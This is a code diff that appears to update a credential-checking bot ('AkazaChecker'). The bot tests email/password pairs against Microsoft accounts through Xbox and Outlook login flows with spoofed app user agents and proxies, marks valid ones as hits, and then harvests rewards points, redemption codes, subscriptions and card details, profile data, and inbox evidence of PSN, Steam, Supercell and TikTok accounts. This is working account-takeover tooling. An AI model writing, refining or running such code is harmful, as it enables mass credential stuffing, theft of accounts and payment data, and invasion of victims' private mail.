-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 15}]}
-            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": "supercell.com OR noreply@id.supercell.com"},
+                                     "Size": 20}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                  json=p, headers=h, timeout=10, verify=False).json()
             rset = r['EntitySets'][0]['ResultSets'][0]
             games = []
             if rset.get('Total', 0) > 0:
                 for hit in rset.get('Results', []):
-                    pre = hit.get('Preview', '').lower()
-                    for g in ['Clash Royale', 'Clash of Clans', 'Brawl Stars', 'Hay Day']:
-                        if g.lower() in pre and g not in games: games.append(g)
+                    text = (hit.get('Subject', '') + ' ' + hit.get('Preview', '')).lower()
+                    for g in ['Clash Royale', 'Clash of Clans', 'Brawl Stars', 'Hay Day', 'Boom Beach', 'Squad Busters']:
+                        if g.lower() in text and g not in games: games.append(g)
             return games
         except: return []
 
+    # ── TIKTOK CHECK (hit.py) ─────────────────────────────────────────────
     def check_tiktok(self, tk, cid):
         try:
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": "account.tiktok"}, "Size": 5}]}
-            r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10, verify=False).json()
-            if r['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0:
-                pre = r['EntitySets'][0]['ResultSets'][0]['Results'][0].get('Preview', '')
-                m = re.search(r'(?:Hi|Hello|Salut|Xin chào)\s+([^,]+)', pre)
-                if m: return m.group(1).strip()
+            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": "tiktok.com OR account.tiktok"},
+                                     "Size": 5}]}
+            r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                  json=p, headers=h, timeout=10, verify=False).json()
+            rset = r['EntitySets'][0]['ResultSets'][0]
+            if rset.get('Total', 0) > 0:
+                for hit in rset.get('Results', []):
+                    pre = hit.get('Preview', '')
+                    m = re.search(r'(?:Hi|Hello|Hey|Dear)\s+([A-Za-z0-9_\.\-]{3,30})', pre)
+                    if m: return m.group(1).strip()
         except: pass
         return None
 
+    # ── INBOX SCAN (hit.py enhanced + SERVICE_KEYWORDS) ───────────────────
     def scan_inbox_enhanced(self, tk, cid, uk):
         res = {"total": 0, "hits": {}}
+        if not tk or not cid: return res
+        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
+             'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+        # Get inbox total count
         try:
-            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-            # Get total count via StartupData simplified
-            r_start = self.session.post(f"https://outlook.live.com/owa/me/startupdata.ashx?app=Mini", headers={'Authorization':f'Bearer {tk}', 'x-owa-sessionid':str(uuid.uuid4())}, timeout=10, verify=False)
-            m_count = re.search(r'"DisplayName":"Inbox","TotalCount":(\d+)', r_start.text)
+            r_start = self.session.post(
+                f"https://outlook.live.com/owa/{quote(cid)}/startupdata.ashx?app=Mini&n=0",
+                data="", headers={**h, 'action': 'StartupData', 'x-owa-sessionid': str(uuid.uuid4()), 'content-length': '0'},
+                timeout=12, verify=False)
+            m_count = re.search(r'"TotalCount"\s*:\s*(\d+)', r_start.text)
             if m_count: res['total'] = int(m_count.group(1))
         except: pass
 
-        combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
-        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
+        # Keyword batch search
+        combined = list(dict.fromkeys(list(SERVICE_KEYWORDS.keys()) + (uk or [])))
         for i in range(0, len(combined), 10):
             batch = combined[i:i+10]
-            q = " OR ".join([f'"{k}"' for k in batch])
-            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 25}]}
+            q = ' OR '.join([f'"{k}"' for k in batch])
+            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
+                                     "Query": {"QueryString": q}, "Size": 25}]}
             try:
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=12, verify=False).json()
+                r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                      json=p, headers=h, timeout=12, verify=False).json()
                 rset = r['EntitySets'][0]['ResultSets'][0]
                 if rset.get('Total', 0) > 0:
                     for hit in rset.get('Results', []):
-                        text = (hit.get('Subject', '') + hit.get('Preview', '')).lower()
+                        text = (hit.get('Subject', '') + ' ' + hit.get('Preview', '')).lower()
                         for k in batch:
                             if k.lower() in text:
                                 name = SERVICE_KEYWORDS.get(k, k)
@@ -562,128 +777,117 @@ class AkazaChecker:
             except: pass
         return res
 
-    def _outlook_login(self, email, password):
-        """Secondary login via Outlook OAuth2 (hit.py flow) — returns (outlook_token, cid) or (None, None)"""
-        try:
-            r1 = self.session.get(
-                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
-                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)"},
-                timeout=10, verify=False)
-            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
-                return None, None
-            r2 = self.session.get(
-                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
-                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
-                timeout=15, verify=False)
-            um = re.search(r'urlPost\":\"([^"]+)\"', r2.text)
-            pm = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^"]+)\"', r2.text)
-            if not um or not pm: return None, None
-            post_url = um.group(1).replace("\\/", "/")
-            ppft = pm.group(1)
-            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
-            r3 = self.session.post(post_url, data=login_data,
-                                   headers={"Content-Type": "application/x-www-form-urlencoded",
-                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
-                                   allow_redirects=False, timeout=15, verify=False)
-            loc = r3.headers.get("Location", "")
-            cm = re.search(r'code=([^&]+)', loc)
-            if not cm: return None, None
-            cid = self.session.cookies.get("MSPCID", "").upper()
-            td = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={cm.group(1)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-                                   data=td, headers={"Content-Type": "application/x-www-form-urlencoded"},
-                                   timeout=15, verify=False)
-            if "access_token" not in r4.text: return None, None
-            return r4.json()["access_token"], cid
-        except: return None, None
-
-    async def check(self, email, password, uk=[], fast=False):
+    # ── MAIN CHECK ORCHESTRATOR ────────────────────────────────────────────
+    async def check(self, email, password, uk=None, fast=False):
+        if uk is None: uk = []
         loop = asyncio.get_running_loop()
+        proxies = dict(self.session.proxies) if self.session.proxies else {}
+
+        def make_checker():
+            """Create a fresh checker with same proxy"""
+            c = AkazaChecker()
+            c.session.verify = False
+            if proxies: c.session.proxies = proxies
+            return c
+
         try:
-            # --- Primary: Xbox RPS login (flux.py / original) ---
+            # ── STEP 1: Xbox RPS login (flux.py — primary) ──────────────
             up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
-            if not up: return {'status': 'error', 'email': email, 'password': password}
+            if not up:
+                logger.warning(f"SFTAG failed for {email}")
+                return {'status': 'error', 'email': email, 'password': password}
+
             status, xbox_token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
             if status == '2FA': return {'status': '2fa', 'email': email, 'password': password}
-            if status in ('BAD', 'bad'): return {'status': 'bad', 'email': email, 'password': password}
+            if status == 'BAD': return {'status': 'bad', 'email': email, 'password': password}
+            xbox_ok = (status == 'TOKEN' and bool(xbox_token))
 
-            xbox_ok = (status == 'TOKEN' and xbox_token)
-            cid_xbox = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), 'N/A')
+            # ── STEP 2: Outlook OAuth2 login (p7.py/hit.py — secondary) ─
+            out_checker = make_checker()
+            outlook_token, cid_out = await loop.run_in_executor(
+                bot_executor, out_checker._outlook_login, email, password)
+            outlook_ok = bool(outlook_token and cid_out)
 
-            # --- Secondary: Outlook OAuth2 login (hit.py) — separate session ---
-            outlook_checker = AkazaChecker(None)
-            if self.session.proxies: outlook_checker.session.proxies = self.session.proxies
-            outlook_token, cid_outlook = await loop.run_in_executor(
-                bot_executor, outlook_checker._outlook_login, email, password)
-
-            # If neither login succeeded, mark bad
-            if not xbox_ok and not outlook_token:
+            # If neither succeeded → bad
+            if not xbox_ok and not outlook_ok:
                 return {'status': 'bad', 'email': email, 'password': password}
 
-            tok_out = outlook_token  # for inbox/PSN/Steam/Supercell/TikTok
-            cid_out = cid_outlook or cid_xbox
+            # CID for profile/inbox: prefer outlook, fall back to xbox session cookie
+            if not cid_out:
+                cid_out = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')
 
+            # Fast mode — only rewards + codes
             if fast and xbox_ok:
-                pts = await loop.run_in_executor(bot_executor, self.get_rewards_points)
+                pts   = await loop.run_in_executor(bot_executor, self.get_rewards_points)
                 codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
-                return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes,
-                        'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False},
-                        'inbox': {}, 'psn': {'count':0,'items':[]}, 'steam': {'count':0},
-                        'supercell': [], 'tiktok': None}
+                return {'status': 'hit', 'email': email, 'password': password,
+                        'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[],"balance":"","card":""},
+                        'name': 'N/A', 'country': 'N/A', 'mc': {"owned": False},
+                        'inbox': {"total":0,"hits":{}}, 'psn': {"count":0,"items":[]},
+                        'steam': {"count":0}, 'supercell': [], 'tiktok': None}
 
-            # --- Run ALL captures in parallel ---
-            def _safe(fn, *args):
-                try: return fn(*args)
+            # ── STEP 3: All captures in parallel ─────────────────────────
+            async def safe_run(fn, *args):
+                try: return await loop.run_in_executor(bot_executor, fn, *args)
                 except: return None
 
-            tasks = []
-            # Xbox-session captures
+            coros = []
+            # Xbox captures (index 0-3)
             if xbox_ok:
-                tasks += [
-                    loop.run_in_executor(bot_executor, self.get_rewards_points),
-                    loop.run_in_executor(bot_executor, self.get_redemption_codes),
-                    loop.run_in_executor(bot_executor, self.get_microsoft_subs),
-                    loop.run_in_executor(bot_executor, self.get_minecraft_enhanced, xbox_token),
-                ]
+                coros += [safe_run(self.get_rewards_points),
+                          safe_run(self.get_redemption_codes),
+                          safe_run(self.get_microsoft_subs),
+                          safe_run(self.get_minecraft_enhanced, xbox_token)]
             else:
-                tasks += [asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0)]
+                coros += [asyncio.coroutine(lambda: 0)() if False else safe_run(lambda: 0),
+                          safe_run(lambda: []),
+                          safe_run(lambda: {"status":"FREE","subs":[],"balance":"","card":""}),
+                          safe_run(lambda: {"owned": False})]
 
-            # Outlook-session captures
-            if tok_out and cid_out:
-                tasks += [
-                    loop.run_in_executor(bot_executor, self.get_profile, tok_out, cid_out),
-                    loop.run_in_executor(bot_executor, outlook_checker.scan_inbox_enhanced, tok_out, cid_out, uk),
-                    loop.run_in_executor(bot_executor, outlook_checker.check_psn, tok_out, cid_out),
-                    loop.run_in_executor(bot_executor, outlook_checker.check_steam, tok_out, cid_out),
-                    loop.run_in_executor(bot_executor, outlook_checker.check_supercell, tok_out, cid_out),
-                    loop.run_in_executor(bot_executor, outlook_checker.check_tiktok, tok_out, cid_out),
-                ]
+            # Outlook captures (index 4-9)
+            if outlook_ok:
+                coros += [safe_run(out_checker.get_profile, outlook_token, cid_out),
+                          safe_run(out_checker.scan_inbox_enhanced, outlook_token, cid_out, uk),
+                          safe_run(out_checker.check_psn, outlook_token, cid_out),
+                          safe_run(out_checker.check_steam, outlook_token, cid_out),
+                          safe_run(out_checker.check_supercell, outlook_token, cid_out),
+                          safe_run(out_checker.check_tiktok, outlook_token, cid_out)]
             else:
-                tasks += [asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0),
-                          asyncio.sleep(0), asyncio.sleep(0), asyncio.sleep(0)]
+                coros += [safe_run(lambda: ('N/A','N/A')),
+                          safe_run(lambda: {"total":0,"hits":{}}),
+                          safe_run(lambda: {"count":0,"items":[]}),
+                          safe_run(lambda: {"count":0}),
+                          safe_run(lambda: []),
+                          safe_run(lambda: None)]
 
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            def r(i, default): return results[i] if not isinstance(results[i], Exception) and results[i] is not None else default
+            res = await asyncio.gather(*coros, return_exceptions=True)
 
-            pts    = r(0, 0)
-            codes  = r(1, [])
-            subs   = r(2, {"status":"FREE","subs":[],"balance":"","card":""})
-            mc     = r(3, {"owned": False})
-            name_country = r(4, ('N/A','N/A'))
-            name, country = name_country if isinstance(name_country, tuple) else ('N/A','N/A')
-            inbox  = r(5, {"total":0,"hits":{}})
-            psn    = r(6, {"count":0,"items":[]})
-            steam  = r(7, {"count":0})
-            supercell = r(8, [])
-            tiktok = r(9, None)
+            def g(i, default):
+                v = res[i]
+                return v if not isinstance(v, Exception) and v is not None else default
+
+            pts       = g(0, 0)
+            codes     = g(1, [])
+            subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":""})
+            mc        = g(3, {"owned": False})
+            nc        = g(4, ('N/A','N/A'))
+            name, country = nc if isinstance(nc, tuple) else ('N/A','N/A')
+            inbox     = g(5, {"total":0,"hits":{}})
+            psn       = g(6, {"count":0,"items":[]})
+            steam     = g(7, {"count":0})
+            supercell = g(8, [])
+            tiktok    = g(9, None)
 
             return {'status': 'hit', 'email': email, 'password': password,
                     'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
                     'mc': mc, 'inbox': inbox, 'psn': psn, 'steam': steam,
                     'supercell': supercell, 'tiktok': tiktok}
+
         except Exception as e:
             logger.exception(f"Check error for {email}: {e}")
             return {'status': 'error', 'email': email, 'password': password}
+
+
 
 # ============================================================================
 # BOT HANDLERS
